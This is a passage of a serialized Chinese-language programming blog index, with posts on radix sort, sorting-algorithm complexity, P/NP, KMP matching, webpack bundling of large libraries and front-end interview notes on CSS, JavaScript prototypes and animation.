{%asset_img tong_sort_2.png%}</p>\n<p>即两张牌，若花色不同，不论面值怎样，花色低的那张牌小于花色高的，只有在同花色情况下，大小关系才由面值的大小确定。这就是多关键码排序。</p>\n<p>为得到排序结果，我们讨论两种排序方法。</p>\n<p>方法1：先对花色排序，将其分为4 个组，即梅花组、方块组、红心组、黑心组。再对每个组分别按面值进行排序，最后，将4 个组连接起来即可。</p>\n<p>方法2：先按13 个面值给出13 个编号组(2 号，3 号，...，A 号)，将牌按面值依次放入对应的编号组，分成13 堆。再按花色给出4 个编号组(梅花、方块、红心、黑心)，将2号组中牌取出分别放入对应花色组，再将3 号组中牌取出分别放入对应花色组，……，这样，4 个花色组中均按面值有序，然后，将4 个花色组依次连接起来即可。</p>\n<p>设n 个元素的待排序列包含d 个关键码{k1，k2，…，kd}，则称序列对关键码{k1，k2，…，kd}有序是指：对于序列中任两个记录r[i]和r<a href=\"1%E2%89%A4i%E2%89%A4j%E2%89%A4n\">j</a>都满足下列有序关系：</p>\n<p>其中k1 称为最主位关键码，kd 称为最次位关键码 。</p>\n<h4 id=\"两种多关键码排序方法：\">两种多关键码排序方法：</h4>\n<p>多关键码排序按照从最主位关键码到最次位关键码或从最次位到最主位关键码的顺序逐次排序，分两种方法：</p>\n<p>最高位优先(Most Significant Digit first)法，简称MSD 法：</p>\n<p>1）先按k1 排序分组，将序列分成若干子序列，同一组序列的记录中，关键码k1 相等。</p>\n<p>2）再对各组按k2 排序分成子组，之后，对后面的关键码继续这样的排序分组，直到按最次位关键码kd 对各子组排序后。</p>\n<p>3）再将各组连接起来，便得到一个有序序列。扑克牌按花色、面值排序中介绍的方法一即是MSD 法。</p>\n<p>最低位优先(Least Significant Digit first)法，简称LSD 法：</p>\n<p>1) 先从kd 开始排序，再对kd-1进行排序，依次重复，直到按k1排序分组分成最小的子序列后。</p>\n<p>2) 最后将各个子序列连接起来，便可得到一个有序的序列, 扑克牌按花色、面值排序中介绍的方法二即是LSD 法。</p>\n<h4 id=\"基于lsd方法的链式基数排序的基本思想\">基于LSD方法的链式基数排序的基本思想</h4>\n<p>“多关键字排序”的思想实现“单关键字排序”。对数字型或字符型的单关键字，可以看作由多个数位或多个字符构成的多关键字，此时可以采用“分配-收集”的方法进行排序，这一过程称作基数排序法，其中每个数字或字符可能的取值个数称为基数。比如，扑克牌的花色基数为4，面值基数为13。在整理扑克牌时，既可以先按花色整理，也可以先按面值整理。按花色整理时，先按红、黑、方、花的顺序分成4摞（分配），再按此顺序再叠放在一起（收集），然后按面值的顺序分成13摞（分配），再按此顺序叠放在一起（收集），如此进行二次分配和收集即可将扑克牌排列有序。</p>\n<h2 id=\"基数排序\">基数排序:</h2>\n<p>O(d(n+r)，其中：d为待排列数字的最大位数，n为待排序列的长度，r为进制数 </p>\n<p>是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。基数排序基于分别排序，分别收集，所以是稳定的。</p>\n<h4 id=\"算法实现\">算法实现</h4>\n<pre><code class=\"language-js\">/*\n/*\n\n// 第一步\n\n0 90 100\n1 \n2\n3\n4\n5 15 75\n6 46\n7 37\n8 48\n9 99\n\n=&gt; 90 100 15 75 46 37 48 99\n\n// 第二步\n\n0 100\n1 15\n2\n3 37\n4 46 48\n5\n6\n7 75\n8\n9 90 99\n\n=&gt; 100 15 37 46 48 75 90 99\n\n// 第三步\n\n0 15 37 46 48 75 90 99\n1 100 \n2\n3\n4\n5\n6\n7\n8\n9\n=&gt; 15 37 46 48 75 90 99 100\n*/\nvar counter = [];\nfunction radixSort(arr, maxDigit) {\n    var mod = 10;\n    var dev = 1;\n    for (var i = 0; i &lt; maxDigit; i++, dev *= 10, mod *= 10) {\n        for(var j = 0; j &lt; arr.length; j++) {\n            var bucket = parseInt((arr[j] % mod) / dev);\n            if(counter[bucket]==null) {\n                counter[bucket] = [];\n            }\n            counter[bucket].push(arr[j]);\n        }\n        //按照bucket的 顺序写入数组\n        var pos = 0;\n        for(var j = 0; j &lt; counter.length; j++) {\n            var value = null;\n            if(counter[j]!=null) {\n                while ((value = counter[j].shift()) != null) {\n                      arr[pos++] = value;\n                }\n          }\n        }\n    }\n    return arr;\n} </code></pre>\n<h2 id=\"总结\">总结</h2>\n<p> {%asset_img all_sort.png%}</p>\n<p>各种排序的稳定性，时间复杂度和空间复杂度总结：</p>\n<h4 id=\"时间复杂度来说：\">时间复杂度来说：</h4>\n<p>(1)平方阶(O(n2))排序\n各类简单排序:直接插入、直接选择和冒泡排序；</p>\n<p>(2)线性对数阶(O(nlog2n))排序\n快速排序、堆排序和归并排序；</p>\n<p>(3)O(n1+§))排序,§是介于0和1之间的常数。\n希尔排序</p>\n<p>(4)线性阶(O(n))排序\n基数排序，此外还有桶、箱排序。</p>\n<p>说明：</p>\n<p>当原表有序或基本有序时，直接插入排序和冒泡排序将大大减少比较次数和移动记录的次数，时间复杂度可降至O（n）；</p>\n<p>而快速排序则相反，当原表基本有序时，将蜕化为冒泡排序，时间复杂度提高为O（n2）；</p>\n<p>原表是否有序，对简单选择排序、堆排序、归并排序和基数排序的时间复杂度影响不大。</p>\n<h4 id=\"稳定性：\">稳定性：</h4>\n<p>排序算法的稳定性:若待排序的序列中，存在多个具有相同关键字的记录，经过排序， 这些记录的相对次序保持不变，则称该算法是稳定的；若经排序后，记录的相对 次序发生了改变，则称该算法是不稳定的。</p>\n<p>稳定性的好处：排序算法如果是稳定的，那么从一个键上排序，然后再从另一个键上排序，第一个键排序的结果可以为第二个键排序所用。基数排序就是这样，先按低位排序，逐次按高位排序，低位相同的元素其顺序再高位也相同时是不会改变的。另外，如果排序算法稳定，可以避免多余的比较；</p>\n<p><strong>稳定的排序算法：冒泡排序、插入排序、归并排序和基数排序</strong></p>\n<p><strong>不是稳定的排序算法：选择排序、快速排序、希尔排序、堆排序</strong></p>\n<h4 id=\"选择排序算法准则：\">选择排序算法准则：</h4>\n<p>每种排序算法都各有优缺点。因此，在实用时需根据不同情况适当选用，甚至可以将多种方法结合起来使用。</p>\n<p>选择排序算法的依据</p>\n<p>影响排序的因素有很多，平均时间复杂度低的算法并不一定就是最优的。相反，有时平均时间复杂度高的算法可能更适合某些特殊情况。同时，选择算法时还得考虑它的可读性，以利于软件的维护。一般而言，需要考虑的因素有以下四点：</p>\n<p>1.待排序的记录数目n的大小；\n2.记录本身数据量的大小，也就是记录中除关键字外的其他信息量的大小；\n3.关键字的结构及其分布情况；\n4.对排序稳定性的要求。</p>\n<p>设待排序元素的个数为n.</p>\n<p>1）当n较大，则应采用时间复杂度为O(nlog2n)的排序方法：快速排序、堆排序或归并排序序。\n快速排序：是目前基于比较的内部排序中被认为是最好的方法，当待排序的关键字是随机分布时，快速排序的平均时间最短；\n堆排序：如果内存空间允许且要求稳定性的，\n归并排序：它有一定数量的数据移动，所以我们可能过与插入排序组合，先获得一定长度的序列，然后再合并，在效率上将有所提高。</p>\n<p>2）当n较大，内存空间允许，且要求稳定性 =》归并排序</p>\n<p>3）当n较小，可采用直接插入或直接选择排序。\n直接插入排序：当元素分布有序，直接插入排序将大大减少比较次数和移动记录的次数。\n直接选择排序：元素分布有序，如果不要求稳定性，选择直接选择排序</p>\n<p>5）一般不使用或不直接使用传统的冒泡排序。</p>\n<p>6）基数排序\n它是一种稳定的排序算法，但有一定的局限性：</p>\n<p>1、关键字可分解。\n2、记录的关键字位数较少，如果密集更好\n3、如果是数字时，最好是无符号的，否则将增加相应的映射复杂度，可先将其正负分开排序。</p>\n<h2 id=\"p问题\">P问题</h2>\n<p>P是一个判定问题类,这些问题可以用一个确定性算法在多项式时间内判定或解出。如果一个判定性问题的复杂度是该问题的一个实例的规模n的多项式函数，则我们说这种可以在多项式时间内解决的判定性问题属于P类问题。P类问题就是所有复杂度为多项式时间的问题的集合。\nNP是一个判定问题类,这些问题可以用一个确定算法在多项式时间内检查或验证出它们的解;P事实上很直观,我们通常在编程中求解的问题大多都是P类问题.比如说排序,找最短路径等.\n2、NP问题 然而有些问题很难找到多项式时间的算法（或许根本不存在），比如找出无向图中的哈米尔顿回路问题，但是我们发现如果给了我们该问题的一个答案，我们可以在多项式时间内判断这个答案是否正确。比如说对于哈米尔顿回路问题，给一个任意的回路，我们很容易判断他是否是哈米尔顿回路（只要看是不是所有的顶点都在回路中就可以了）。这种可以在多项式时间内验证一个解是否正确的问题称为NP问题。显然，所有的P类问题都是属于NP问题的，但是现在的问题是，P是否等于NP?这个问题至今还未解决。\nNP这个类事实上也很有趣,它并不要求给出一个算法来求解问题本身,而只是要求给出一个确定性算法在多项式时间内验证它的解.\n3、NP完全问题 此外请注意，NP问题不一定都是难解的问题，比如，简单的数组排序问题是P类问题，但是P属于NP，所以也是NP问题，你能说他很难解么？刚才说了，现在还不知道是否有P=NP或者P&lt;&gt;NP，但是后来人们发现还有一系列的特殊NP问题，这类问题的特殊性质使得很多人相信P&lt;&gt;NP，只不过现在还无法证明。这类特殊的NP问题就是NP完全问题（NPC问题，C代表complete）。 NP完全问题是求NP中判定问题的一个子类.NPC问题存在着一个令人惊讶的性质，即如果一个NPC问题存在多项式时间的算法，则所有的NP问题都可以在多项式时间内求解，即P=NP成立！！这是因为，每一个NPC问题可以在多项式时间内转化成任何一个NP问题。比如前面说的哈米尔顿回路问题就是一个NPC问题。NPC问题的历史并不久，cook在1971年找到了第一个NPC问题，此后人们又陆续发现很多NPC问题，现在可能已经有3000多个了。所以，我们一般认为NPC问题是难解的问题，因为他不太可能存在一个多项式时间的算法（如果存在则所有的NP问题都存在多项式时间算法，这太不可思议了，但是也不是不可能）。类似哈米尔顿回路/路径问题，货郎担问题，集团问题，最小边覆盖问题（注意和路径覆盖的区别），等等很多问题都是NPC问题，所以都是难解的问题。</p>\n<h2 id=\"kmp\">KMP</h2>\n<p>手算KMP匹配的Next值和Nextval值\n<a href=\"https://www.slyar.com/blog/kmp-next-nextval.html\">https://www.slyar.com/blog/kmp-next-nextval.html</a>\n<a href=\"http://blog.csdn.net/yutianzuijin/article/details/11954939\">http://blog.csdn.net/yutianzuijin/article/details</a></p>\n<p>字符串f每一个位置的最大公共长度。这个最大公共长度在算法导论里面被记为next数组。假设我们现在已经求得next[1]、next[2]、……next[i]，分别表示长度为1到i的字符串的前缀和后缀最大公共长度，现在要求next[i+1]。由上图我们可以看到，\n1、如果位置i和位置next[i]处的两个字符相同（下标从零开始），则next[i+1]等于next[i]加1\n2、如果两个位置的字符不相同，我们可以将长度为next[i]的字符串继续分割，获得其最大公共长度next[next[i]]，然后再和位置i的字符比较。如果位置next[next[i]]和位置i的字符相同，则next[i+1]就等于next[next[i]]加1。如果不相等，就可以继续分割长度为next[next[i]]的字符串，直到字符串长度为0为止</p>\n<pre><code class=\"language-js\">void getNext(char*t)\n{\n    int i=0;\n    int j=-1;\n    next[i]=-1;\n    int lent=strlen(t);\n    while(i&lt;lent){\n        if(j==-1||t[i]==t[j]){\n            i++;\n            j++;\n            next[i]=j;\n        }\n        else j=next[j];\n    }\n}\n\nint kmp(char*s,char*t){\n    int lens=strlen(s);\n    int lent=strlen(t);\n    getNext (t);\n    int i=-1,j=-1;\n    int cnt=0;\n    while(i&lt;lens){\n        if(j==-1||t[j]==s[i]) {\n            i++;\n            j++;\n        }\n    // 如果第i+1个位置不同，则出现不匹配，我们依旧要将长度为j的字符串分割，获得其最大公共长度next[j]，然后从next[j]继续比较两个字符串\n        else j=next[j];。\n        if(j==lent){\n            j--;\n            i--;\n            j=next[j];\n            cnt++;\n        }\n    }\n    return cnt;//s中有cnt 个t子串\n}\n</code></pre>\n","index":21},{"filePath":"post\\2018\\9\\bigfile-webpack.md","htmlPath":"/post/2018/9/bigfile-webpack.html","name":"bigfile-webpack.md","type":"md","title":"库文件太大，webpack打包时怎么办","date":"2018/9/3","categories":"Experience","tags":"专题探究","html":"<p>针对上篇gojs太大的问题的衍生出大文件打包的问题</p>\n<h3 id=\"exclude-设置不通过babel-loader编译的目录\">exclude 设置不通过babel-loader编译的目录</h3>\n<p>写成从node_modules导入的，就不会出现run慢或者报错，还很快。这是为什么?\n是因为node_modules里面不会再实时编译了\n那有没有方法，webpack可以设置一些不实时编译的文件</p>\n<pre><code class=\"language-js\">{\n        test: /\\.js$/,\n        loader: &#39;babel-loader&#39;,\n        include: [resolve(&#39;src&#39;)],\n        exclude:[\n          resolve(&quot;src/components/common/gojs&quot;)\n        ]\n      },</code></pre>\n<p>exclude可以排除目录 ，不用babel-loader编译</p>\n<p>库很大，要么分包 ，或异步加载，或单独引入，否则生成环境打的包会很大</p>\n<h3 id=\"externals设置不打包的文件\">externals设置不打包的文件</h3>\n<p>打包的时候不打包这个，然后需要在生产环境页面单独引入这个script</p>\n<pre><code class=\"language-js\">externals:{\n    &#39;go&#39;:&#39;go&#39;\n}</code></pre>\n<pre><code class=\"language-html\">&lt;script type=&quot;text/javascript&quot; src=&quot;./static/js/go.js&quot;&gt;&lt;/script&gt;</code></pre>\n<h3 id=\"add-asset-html-webpack-plugin\">add-asset-html-webpack-plugin</h3>\n<p>add-asset-html-webpack-plugin，可以配置修改打包后的index.html.\n在webpack.prod.config中引入并添加，用法如下：</p>\n<pre><code class=\"language-js\">new AddAssetHtmlPlugin({\n    filepath:path.join(__dirname,&#39;src/components/common/gojs/go.js&#39;),\n    outputPath:&#39;./static/js&#39;,\n    publicPath:&#39;./static/js&#39;,//script标签中的路径前缀\n    includeSourcemap:false\n})</code></pre>\n<p>打包后结果如下：</p>\n<pre><code class=\"language-html\">&lt;/div&gt;&lt;/div&gt;\n&lt;script type=&quot;text/javascript&quot; src=&quot;./static/js/go.js&quot;&gt;&lt;/script&gt;</code></pre>\n<h3 id=\"commonschunkplugin分包，htmlwebpackplugin插入\">CommonsChunkPlugin分包，HtmlWebpackPlugin插入</h3>\n<p>分包等的时间久点</p>\n<pre><code class=\"language-js\">var chunks = [&#39;manifest&#39;, &#39;vendor&#39;, &#39;gojs&#39;, &#39;app&#39;];\nnew webpack.optimize.CommonsChunkPlugin({\n      name: &#39;gojs&#39;,\n      minChunks (module) {\n        // any required modules inside node_modules are extracted to vendor\n        return (\n          module.resource &amp;&amp;\n          /go\\.js$/.test(module.resource) === 0\n        )\n      }\n    }),\n new HtmlWebpackPlugin({\n      filename: config.build.index,\n      template: &#39;index.html&#39;,\n      inject: true,\n      minify: {\n        removeComments: true,\n        collapseWhitespace: true,\n        removeAttributeQuotes: true\n      },\n      chunks,\n      chunksSortMode: function(a, b) {\n        return chunks.indexOf(a.names[0]) - chunks.indexOf(b.names[0])\n      },\n    }),</code></pre>\n","index":22},{"filePath":"post\\2018\\9\\mianjing.md","htmlPath":"/post/2018/9/mianjing.html","name":"mianjing.md","type":"md","title":"面经收集--HTML+CSS+JS","date":"2018/9/8","categories":"Collection","tags":"面经","html":"<p><a href=\"https://segmentfault.com/a/1190000011635556?utm_source=tag-newest\">https://segmentfault.com/a/1190000011635556?utm_source=tag-newest</a></p>\n<h4 id=\"本质上说，xhtml是一个过渡技术，结合了xml有几分的强大功能及html大多数的简单特性。\">本质上说，XHTML是一个过渡技术，结合了XML(有几分)的强大功能及HTML(大多数)的简单特性。</h4>\n<p>以下是 XHTML 相对 HTML 的几大区别：\nXHTML 要求正确嵌套、\nXHTML 所有元素必须关闭、\nXHTML 区分大小写、\nXHTML 属性值要用双引号、\nXHTML 用 id 属性代替 name 属性、\nXHTML 特殊字符的处理</p>\n<h4 id=\"table布局应用场景：\">table布局应用场景：</h4>\n<p>同行等高、\n宽度自动调节</p>\n<h4 id=\"bfc\">BFC</h4>\n<p>(Block formatting context)直译为&quot;块级格式化上下文&quot;。它是一个独立的渲染区域，只有Block-level box参与， 它规定了内部的Block-level Box如何布局，并且与这个区域外部毫不相干。</p>\n<p>哪些元素会生成BFC?</p>\n<ol>\n<li>根元素</li>\n<li>float属性不为none</li>\n<li>position为absolute或fixed</li>\n<li>display为inline-block, table-cell, table-caption, flex, inline-flex</li>\n<li>overflow不为visible\n<a href=\"http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html\">http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html</a></li>\n</ol>\n<h4 id=\"你知道attribute和property的区别么\">你知道attribute和property的区别么</h4>\n<p>DOM有其默认的基本属性，而这些属性就是所谓的“property”.\nproperty能够从attribute中得到同步；\nattribute不会同步property上的值；\nattribute和property之间的数据绑定是单向的，attribute-&gt;property；</p>\n<h4 id=\"流式布局如何实现，响应式布局如何实现\">流式布局如何实现，响应式布局如何实现</h4>\n<p><a href=\"https://www.cnblogs.com/yanayana/p/7066948.html\">https://www.cnblogs.com/yanayana/p/7066948.html</a></p>\n<h4 id=\"实现两栏布局有哪些方法？\">实现两栏布局有哪些方法？</h4>\n<p><a href=\"https://segmentfault.com/a/1190000010698609\">https://segmentfault.com/a/1190000010698609</a></p>\n<h4 id=\"实现三栏布局（圣杯布局，双飞翼布局，flex布局）\">实现三栏布局（圣杯布局，双飞翼布局，flex布局）</h4>\n<p><a href=\"https://blog.csdn.net/wangchengiii/article/details/77926868\">https://blog.csdn.net/wangchengiii/article/details/77926868</a></p>\n<h4 id=\"padding-top、margin-top等四个方向的值取决于父元素的宽，和父元素的高没有一点关系\">padding-top、margin-top…等四个方向的值取决于父元素的<strong>宽</strong>，和父元素的高没有一点关系</h4>\n<h4 id=\"bind\">bind</h4>\n<p>至于bind方法，他是直接改变这个函数的this指向并且返回一个新的函数，之后再次调用这个函数的时候this都是指向bind绑定的第一个参数。</p>\n<pre><code class=\"language-js\">const test2 = dog.eatBone.bind(cat, &#39;喵喵喵&#39;, &#39;bind&#39;)\ntest2()</code></pre>\n<h4 id=\"new-一个对象具体做了什么\">new 一个对象具体做了什么</h4>\n<p>(1) 创建一个新对象；\n(2)新对象的_proto_属性指向构造函数的原型对象。\n(3) 将构造函数的作用域赋给新对象（因此 this 就指向了这个新对象） ；\n(4) 执行构造函数中的代码（为这个新对象添加属性） ；\n(5) 返回新对象。</p>\n<h4 id=\"dom事件的绑定的几种方式\">DOM事件的绑定的几种方式</h4>\n<p>call,apply,bind</p>\n<h4 id=\"显示原型prototye和隐式原型_proto_，手绘原型链\">显示原型prototye和隐式原型_proto_，手绘原型链.</h4>\n<p>每一个函数在创建之后都会拥有一个名为prototype的属性，这个属性指向函数的原型对象。\nNote：通过Function.prototype.bind方法构造出来的函数是个例外，它没有prototype属性。</p>\n<p>JavaScript中任意对象都有一个内置属性[[prototype]]，在ES5之前没有标准的方法访问这个内置属性，但是大多数浏览器都支持通过<strong>proto</strong>来访问。ES5中有了对于这个内置属性标准的Get方法Object.getPrototypeOf(). \nNote: Object.prototype 这个对象是个例外，它的<strong>proto</strong>值为null</p>\n<blockquote>\n<p>隐式原型指向这个对象的构造函数(constructor)的prototype</p>\n</blockquote>\n<p>隐式原型的作用：<strong>构成原型链</strong>。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着<strong>proto</strong>依次查找。</p>\n<pre><code class=\"language-js\">function Person(name, age){\n    this.name = name;\n    this.age = age;\n}\n\nfunction Student(score){\n    this.score = score;\n}\n\nStudent.prototype = new Person(&#39;李明&#39;,22);\nvar s = new Student(99);\n\nconsole.log(s instanceof Student);  //true\nconsole.log(s instanceof Person);  //true\nconsole.log(s instanceof Object);  //true\n</code></pre>\n<p>{%asset_img proto_link.png%}</p>\n<p>手绘原型链：\n<a href=\"https://blog.csdn.net/Picking_up_stones/article/details/70050086\">https://blog.csdn.net/Picking_up_stones/article/details/70050086</a></p>\n<p>原型链是什么？\n原型链是一种机制，指的是JavaScript每个对象包括原型对象都有一个内置的[[proto]]属性指向创建它的函数对象的原型对象，直到指向Object对象为止。</p>\n<p>为什么需要原型链？\n继续和共享</p>\n<h4 id=\"typeof-和instanceof原理。\">typeof 和instanceof原理。</h4>\n<ol>\n<li>instanceof原理：<pre><code class=\"language-js\">//设 L instanceof R \n//通过判断\nL.__proto__.__proto__ ..... === R.prototype ？\n//最终返回true or false</code></pre>\n</li>\n</ol>\n<ol start=\"2\">\n<li><p>typeof原理：\n在 javascript 的最初版本中，使用的 32 位系统，为了性能考虑使用低位存储了变量的类型信息：</p>\n<p> 000：对象\n 1：整数\n 010：浮点数\n 100：字符串\n 110：布尔\n 有 2 个值比较特殊：\n undefined：用 - （−2^30）表示。\n null：对应机器码的 NULL 指针，一般是全零。</p>\n<pre><code class=\"language-js\">typeof null === &#39;object&#39;;\n/*这样一来，null 就出了一个 bug。根据 type tags 信息，低位是 000，因此 null 被判断成了一个对象。这就是为什么 typeof null 的返回值是 object。*/\nnull instanceof Object === false</code></pre>\n<p>而</p>\n<pre><code class=\"language-js\">null instanceof null</code></pre>\n<p>会抛出异常：<code>Uncaught TypeError: Right-hand side of &#39;instanceof&#39; is not an object</code></p>\n</li>\n</ol>\n<p>判断类型的代码是这么写:undefined-&gt;对象-&gt;数字-&gt;....</p>\n<h4 id=\"指出js的宿主对象和原生对象的区别，为什么扩展js内置对象不是好的做法？有哪些内置对象和内置函数？\">指出JS的宿主对象和原生对象的区别，为什么扩展JS内置对象不是好的做法？有哪些内置对象和内置函数？</h4>\n<p>原生对象：在运行过程中动态创建的对象，需要new</p>\n<p>内置对象：在引擎初始化阶段就被创建好的对象。而ECMA-262 只定义了两个内置对象，即 Global 和 Math 。内置对象是原生对象的一种。</p>\n<p>宿主对象：ECMAScript官方未定义的对象都属于宿主对象。包含两大类，一个是宿主提供，一个是自定义类对象</p>\n<p>为什么扩展JS内置对象不是好的做法：\n因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。</p>\n<h4 id=\"js动画和css3动画比较requestanimationframe优势\">js动画和css3动画比较/requestAnimationFrame优势</h4>\n<p>CSS动画\n优点： </p>\n<p>(1)浏览器可以对动画进行优化。</p>\n<p>1、 浏览器使用与 requestAnimationFrame 类似的机制，requestAnimationFrame比起setTimeout，setInterval设置动画的优势主要是<br>    1)requestAnimationFrame 会把每一帧中的所有DOM操作集中起来，在一次重绘或回流中就完成,并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率,一般来说,这个频率为每秒60帧。\n    2)在隐藏或不可见的元素中requestAnimationFrame不会进行重绘或回流，这当然就意味着更少的的cpu，gpu和内存使用量。</p>\n<p>2、强制使用硬件加速 （通过 GPU 来提高动画性能）</p>\n<p>(2)代码相对简单,性能调优方向固定，浏览器会对CSS3的动画做一些优化（比如专门新建一个图层用来跑动画）</p>\n<p>(3)对于帧速表现不好的低版本浏览器，CSS3可以做到自然降级，而JS则需要撰写额外代码。</p>\n<p>缺点：</p>\n<p>　　1、 运行过程控制较弱,无法附加事件绑定回调函数。CSS动画只能暂停,不能在动画中寻找一个特定的时间点，不能在半路反转动画，不能变换时间尺度，不能在特定的位置添加回调函数或是绑定回放事件,无进度报告</p>\n<p> 　  2、  代码冗长。想用 CSS 实现稍微复杂一点动画,最后CSS代码都会变得非常笨重。</p>\n<h4 id=\"使用requestanimationframe有什么好处？\">使用<code>requestAnimationFrame</code>有什么好处？</h4>\n<p>浏览器可以优化并行的动画动作，更合理的重新排列动作序列，并把能够合并的动作放在一个渲染周期内完成，从而呈现出更流畅的动画效果。比如，通过requestAnimationFrame()，JS动画能够和CSS动画/变换或SVG SMIL动画同步发生。另外，如果在一个浏览器标签页里运行一个动画，当这个标签页不可见时，浏览器会暂停它，这会减少CPU，内存的压力，节省电池电量。</p>\n<pre><code class=\"language-js\">// shim layer with setTimeout fallback\nwindow.requestAnimFrame = (function(){\n  return  window.requestAnimationFrame       ||\n          window.webkitRequestAnimationFrame ||\n          window.mozRequestAnimationFrame    ||\n          function( callback ){\n            window.setTimeout(callback, 1000 / 60);\n          };\n})();\n\n\n// usage:\n// instead of setInterval(render, 16) ....\n\n(function animloop(){\n  requestAnimFrame(animloop);\n  render();\n})();\n// place the rAF *before* the render() to assure as close to\n// 60fps with the setTimeout fallback.</code></pre>\n<h4 id=\"css3动画，transition和animation的区别，\">css3动画，transition和animation的区别，</h4>\n<ol>\n<li><p> 触发条件不同。transition通常和hover等事件配合使用，由事件触发。animation则和gif动态图差不多，立即播放。</p>\n</li>\n<li><p>循环。 animation可以设定循环次数。 When triggered, a transition runs only once.You can make a transition loop by fiddling with the transitionEnd event, but that isn&#39;t particularly straightforward - especially when compared with animations.</p>\n<blockquote>\n<p>What About transition: all?\nYou do not have to specify every property that you care about when using a transition. You could simplify your life by using the all value instead: transition: all .5s ease-in. I do not recommend this because you will take a performance hit. Your browser is now listening for a whole lotta properties as opposed to just a few that you know you will be modifiying. Unless you have a strong need to do this, I would recommend specifying each CSS property you wish to transition individually.</p>\n</blockquote>\n</li>\n<li><p>精确性。 animation可以设定每一帧的样式和时间。tranistion 只能设定头尾。 animation中可以设置每一帧需要单独变化的样式属性， transition中所有样式属性都要一起变化。</p>\n</li>\n<li><p>与javascript的交互。animation与js的交互不是很紧密。tranistion和js的结合更强大。js设定要变化的样式，transition负责动画效果。A transition only plays as a reaction to a CSS property that has changed</p>\n</li>\n</ol>\n<p><a href=\"https://www.kirupa.com/snippets/move_element_to_click_position.htm\">https://www.kirupa.com/snippets/move_element_to_click_position.htm</a></p>\n<h4 id=\"animation的属性，加速度，重力的模拟实现\">animation的属性，加速度，重力的模拟实现</h4>\n<p><a href=\"https://blog.csdn.net/drd_zsd123/article/details/80126260\">https://blog.csdn.net/drd_zsd123/article/details/80126260</a>\n<a href=\"./canvas.html\">canvas实现</a></p>\n<h4 id=\"什么是use-strict好处和坏处\">什么是“use strict”,好处和坏处</h4>\n<p>优点：</p>\n<ol>\n<li>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</li>\n<li>消除代码运行的一些不安全之处，保证代码运行的安全；</li>\n<li>提高编译器效率，增加运行速度；</li>\n<li>为未来新版本的Javascript做好铺垫。\n注：经过测试 IE6,7,8,9 均不支持严格模式。</li>\n</ol>\n<p>缺点：现在网站的 JS 都会进行压缩，一些文件用了严格模式，而另一些没有。这时这些本来是严格模式的文件，被 merge 后，这个串就到了文件的中间，不仅没有指示严格模式，反而在压缩后浪费了字节</p>\n<p>。</p>\n<h4 id=\"如何实现图片滚动懒加载\">如何实现图片滚动懒加载</h4>\n<p> 通俗的讲就是：当访问一个页面的时候，先把img元素或是其他元素的背景图片路径替换成一张大小为1*1px图片的路径（这样就只需请求一次），只有当图片出现在浏览器的可视区域内时，才设置图片正真的路径，让图片显示出来。这就是图片懒加载。\n如何获取正真的路径，这个简单，现在正真的路径存在元素的<code>data-url</code>（这个名字起个自己认识好记的就行）属性里，要用的时候就取出来，再设置；\n<a href=\"https://www.cnblogs.com/flyromance/p/5042187.html\">https://www.cnblogs.com/flyromance/p/5042187.html</a></p>\n<h4 id=\"es5与es6继承的区别\">ES5与ES6继承的区别</h4>\n<ol>\n<li>ES5先创建子类的实例对象，再实例化父类并添加到子类this中（Parent.apply(this)）<pre><code class=\"language-js\">//在es5中的继承：\nfunction parent(a,b){\nthis a = a;\nthis b = b;\n}\nfunction child(c){\nthis c = c\n};\n</code></pre>\n</li>\n</ol>\n<p>parent.call(child,1,2)//通过子集去继承父级：\n//而去看call的底层方法可知，继承的过程是通过prototype属性,相当于\nchild.prototype = new parent(1,2);</p>\n<pre><code>2. ES6是先创建父类的实例对象，在实例化子类中通过调用super方法访问父级后，再用子类的构造函数修改this。\n```js\nclass parent{\n　　constructor(a,b){\n　　　　this.a = a;\n　　　　this.b = b;\n　　}\n　　parentMethods(){\n　　　　return this.a + this.b\n　　}\n}\nclass child extends parent{\n　　constructor(a,b,c){\n　　　　super(a,b);\n　　　　this.c = c;\n　　}\n　　childMethods(){\n　　　　return this.c + &#39;,&#39; + super.parentMethods()\n　　}\n}\nconst point = new child(1,2,3);\nalert(point.childMethods());</code></pre><p>子类必须在constructor方法中调用super方法，否则新建实例报错。因为子类没有自己的this对象，而是继承了父类的this对象，然后对其进行加工。如果不调用super方法，子类得不到this对象。</p>\n<h4 id=\"moduleexports和exports区别\">module.exports和exports区别</h4>\n<ol>\n<li>module.exports 初始值为一个空对象 {}</li>\n<li>exports 是指向的 module.exports 的引用</li>\n<li>require() 返回的是 module.exports 而不是 exports</li>\n</ol>\n<p>exports是引用 module.exports<strong>的值</strong>。module.exports 被改变的时候，exports不会被改变</p>\n<p> JS如何实现重载和多态\n轮播图的实现，以及轮播图组件开发，轮播10000张图片过程 </p>\n<p>document load和document DOMContentLoaded两个事件的区别</p>\n<p>常用的数组api，字符串api\n原生事件绑定（跨浏览器），dom0和dom2的区别？</p>\n<p>web端cookie的设置和获取\nsetTimeout和promise的执行顺序</p>\n<p>navigator对象，location和history</p>\n<p>手指点击可以触控的屏幕时，是什么事件？\nJS的API有哪些应用到了函数柯里化的实现？(bind函数和数组的reduce方法用到了函数柯里化。)</p>\n<p> 手写Ajax，XMLHttpRequest\n 实现继承的多种方式和优缺点\n 深拷贝\n 编写一个通用的事件监听函数\n 八大排序算法\n websocket的工作原理和机制</p>\n","index":23},{"filePath":"post\\2018\\9\\network.md","htmlPath":"/post/2018/9/network.html","name":"network.md","type":"md","title":"面经收集网络/浏览器/模块化/diff原理","date":"2018/9/10","categories":"Collection","tags":"面经","html":"<p><a href=\"https://segmentfault.com/a/1190000011635556?utm_source=tag-newest\">https://segmentfault.com/a/1190000011635556?utm_source=tag-newest</a></p>\n<h4 id=\"https（对是https）有1次握手\">https（对是https）有1次握手</h4>\n<p>可以把https拆成tcp/tls/http这三层来看，tcp handshake &gt;&gt; TLS(SSL) handshake &gt;&gt; http request/response\n{%asset_img 